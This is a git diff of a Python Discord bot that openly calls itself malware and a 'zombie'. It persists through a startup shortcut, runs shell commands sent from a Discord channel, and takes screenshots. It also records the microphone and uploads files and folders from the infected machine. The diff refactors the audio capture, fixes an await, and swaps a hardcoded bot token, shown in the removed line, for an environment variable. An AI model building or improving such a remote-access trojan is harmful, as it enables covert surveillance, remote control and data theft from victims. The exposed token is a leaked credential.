@@ -1,17 +1,17 @@
 import discord
 from discord.ext import commands
 import subprocess
-import platform
-import sounddevice as sd
-import scipy.io.wavfile as wav
 import os
+from dotenv import load_dotenv
 from utils.setupshortcut import create_shortcut
 from config import TIME, VERSION, target_file, shortcut_file, help_text, home_path, hostname
 from utils.splitter import split_string
 from utils.sysinfo import SystemInfo
 from utils.screenshot import get_screenshot
 from utils.cmd import run_shell_command
+from utils.audio import record_audio
 
+load_dotenv()
 try:
     create_shortcut(target_file, shortcut_file, description="My Shortcut")
 except:
@@ -49,13 +49,13 @@ async def on_ready():
         existing_channel = discord.utils.get(guild.text_channels, name=hostname)
         if existing_channel:
             await existing_channel.send(
-                f"```**VAPOURS'S ZOMBIE WHOSE IP ADDRESS IS: {SystemInfo().get_ip_address} IS PRESENT. "
+                f"```**VAPOURS'S ZOMBIE WHOSE IP ADDRESS IS: {SystemInfo().ip_address} IS PRESENT. "
                 f"MALWARE.VERSION: {VERSION}, TIME: {TIME}**```"
             )
         else:
             new_channel = await guild.create_text_channel(name=hostname)
             await new_channel.send(
-                f"```**VAPOURS'S ZOMBIE WHOSE IP ADDRESS IS: {SystemInfo().get_ip_address} IS PRESENT. "
+                f"```**VAPOURS'S ZOMBIE WHOSE IP ADDRESS IS: {SystemInfo().ip_address} IS PRESENT. "
                 f"MALWARE.VERSION: {VERSION}, TIME: {TIME}**```"
             )
 
@@ -91,9 +91,12 @@ async def shell_commands(ctx):
         try:
             result = split_string(run_shell_command(command))
             for chunk in result:
-                ctx.send(f"```{chunk}```")
+                await ctx.send(f"```{chunk}```")
         except:
             await ctx.send("```Failed to run command.```")
+        
+
+
         
 @bot.command(name="sysinfo")
 async def sysinfo(ctx):
@@ -123,25 +126,16 @@ async def shutdown(ctx):
 async def recordaudio(ctx):
     if is_correct_channel(ctx):
         message = ctx.message.content
-        duration_str = message.replace("capture-audio ", "").strip()
+        duration = int(message.replace("capture-audio ", "").strip())
+        if duration <= 0:
+            await ctx.send("```Duration must be a positive integer.```")
+            return
+
         try:
-            duration = int(duration_str)
-            if duration <= 0:
-                raise ValueError("Duration must be greater than zero.")
-            sample_rate = 44100  # Sample rate in Hz
-
-            audio_data = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=2, dtype='int16')
-            sd.wait()  # Wait until recording is finished
-            wav.write('output_audio.wav', sample_rate, audio_data)
-            await ctx.send(file=discord.File("output_audio.wav"))
-            os.remove("output_audio.wav")
-        except ValueError:
-            await ctx.send("```Invalid duration. Please enter a positive integer.```")
+            buffer = record_audio(duration)
+            await ctx.send(file=discord.File(fp=buffer, filename="audio.wav"))
         except Exception as e:
-            await ctx.send(f"```An error occurred: {e}```")
-
-
-
+            await ctx.send(f"```Error: {e}```")
 
 
 
@@ -155,10 +149,16 @@ async def grab_file(ctx):
         except:
             await ctx.send("```INVALID FILE/AN ERROR OCCURED```")
 
+
+
+
 @bot.command(name="help-tool")
 async def haider(ctx):
     if is_correct_channel(ctx):
         await ctx.send(f"```{help_text}```")
+
+
+
 
 @bot.command(name="grab-folder")
 async def grabber(ctx):
@@ -189,5 +189,6 @@ async def grab_files_in_folder(ctx, folder):
         await ctx.send(f"```Error while accessing {folder}: {e}```")
 
 # Run the bot with your token (ensure you manage this securely)
-bot.run("MTIyNTM4MDkyNzYzMTUyMzk0MA.GWC_96.VITD_ajUnWf33cVPbYhTEoyYV5x-9EeIb1lzjE")
+token = os.getenv("DISCORD_TOKEN_VAPOUR")
+bot.run(token)
 
